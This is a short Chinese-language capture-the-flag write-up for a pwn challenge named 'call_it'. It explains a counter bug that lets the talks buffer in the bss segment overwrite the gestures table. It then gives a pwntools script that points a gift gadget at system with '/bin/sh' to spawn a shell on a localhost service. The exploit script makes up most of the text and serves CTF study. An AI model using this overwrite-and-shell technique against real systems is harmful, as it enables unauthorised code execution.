# call_it

”叽里咕噜说什么呢”

搜索JOP（jump oriented programming）可以得到这篇文章： https://fdlucifer.github.io/2021/01/05/jop-and-pcop

然而做这道题完全不需要阅读任何前置知识。关键的漏洞在于，即使我们走了default case，计数变量i仍会增加。bss段的talks位于gestures前面，所以当i足够大时，我们能够覆盖gestures

gift gadget内容为`(**(code **)(param_1 + 0x10))(*(undefined8 *)(param_1 + 8))`。按照这个格式把system和`/bin/sh`填好即可
```py
from pwn import *
p=remote("localhost",38471)
def talk(payload):
    p.sendlineafter(": ",'1')
    p.sendafter("? ",payload)
for i in range(8):
    p.sendlineafter(": ",'6')
talk(p64(0x00401231)+p64(0x004040e0+0x18)[:-1]) #“最难”的地方在于不能正好输入0x10个字节，否则新循环的scanf会失败，导致程序退出
talk(p64(0x00401228)+b'/bin/sh')
p.sendlineafter(": ",'0')
p.interactive()
```